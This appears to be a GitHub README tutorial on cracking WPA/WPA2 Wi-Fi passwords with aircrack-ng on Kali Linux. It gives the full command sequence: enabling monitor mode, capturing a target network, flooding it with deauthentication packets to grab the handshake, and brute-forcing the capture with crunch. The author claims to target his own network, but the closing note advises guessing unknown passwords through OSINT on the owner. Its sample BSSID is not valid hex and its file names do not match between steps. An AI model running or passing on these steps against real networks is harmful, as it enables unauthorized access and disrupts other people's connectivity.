# WPA-WPA2-wifi-hacking
Aircrack-ng

# Tools 
- Network Adapter ( I used TL-WN722N V2 with monitoring mode .)
- Kali Linux

#Lets Start Cracking 

### Monitoring Mode Setup:

- Before enabling monitoring mode we need to kill some services to avoid interruption .
- Type the below command to see the services that interrupting and kill them.

```
sudo airmon-ng check wlan0
```
```
sudo airmon-ng check kill
```

<img width="443" alt="image" src="https://github.com/Kamalesh-Seervi/WPA-WPA2-wifi-hacking-/assets/107933310/d36b97d7-e46e-48cd-b2cf-ca582fb69c1e">

- Now stop the wlan0 to enable monitor mode, follow the below command to enable it .
```
ifconfig wlan0 down
```
```
iwconfig wlan0 mode monitor
```
```
ifconfig wlan0 up
```

- If you type `iwconfig` you will the mode of wlan0 as monitor mode.

<img width="724" alt="image" src="https://github.com/Kamalesh-Seervi/WPA-WPA2-wifi-hacking-/assets/107933310/059c34b2-708c-4d2a-a3fa-69b9e3209e6f">

### Lets Capture the packet and 4-way HackShake

- First we need to capture the network for BSSID so type the below command for it .
```
airodump-ng wlan0
```
![PHOTO-2023-11-20-21-14-50](https://github.com/Kamalesh-Seervi/WPA-WPA2-wifi-hacking-/assets/107933310/c14ff384-129d-43e5-b225-4325d6922b04)

- Now i take a particular BSSID to monitor it lets take Kamalesh D BSSID because its my network.
- Type the below command to monitor the particular BSSID network.

```
airodump-ng -c 1 -w Scan_network --bssid EW:WV:4H:J7:A5:28 wlan0
```
![PHOTO-2023-11-20-21-17-14](https://github.com/Kamalesh-Seervi/WPA-WPA2-wifi-hacking-/assets/107933310/41241303-70d3-4eba-a6bd-8c94d5dc5f6e)

#### Note:
- Run the above command in background.

### Deauth process using airplay-ng

- Now i need to deauth the wifi to get the 4 way hackshake and get a .cap file.
- Run the below command to deauth it.
```
sudo aireplay-ng -0 0 -a EW:WV:4H:J7:A5:28 wlan0
```

 <img width="753" alt="image" src="https://github.com/Kamalesh-Seervi/WPA-WPA2-wifi-hacking-/assets/107933310/11e4ecf9-e7fa-45c6-bce7-ab624fd424ac">

- Run the code until you see 4-way handshake mentioned in the background running code.

### Final stage to Crack it .

- We are gonna use `Crunch` and `aircrack-ng` to find the password and with the help of Scan_network.cap file.
- Type below command to start the proccess with help of crunch we give set a possible letters/alpha/symbols and pass that to aircrack to decrypt the .cap file.
```
 sudo crunch 8 8 123456780 | aircrack-ng -w - Scan_Kamalesh-01.cap -e Kamalesh D
```

![PHOTO-2023-11-20-14-32-08](https://github.com/Kamalesh-Seervi/WPA-WPA2-wifi-hacking-/assets/107933310/ab3598be-4927-4c58-8db4-b362606daf65)


## Note:
- For crunch i used only numeric because i know the wifi password i set it to only numeric.
- If you dont know the password try to guess use social footprint and try to find the length otherwise if you want to try all the possibility it is billions which is not possible to crack it on pc its takes years to crack it so try to guess and use OSINT.
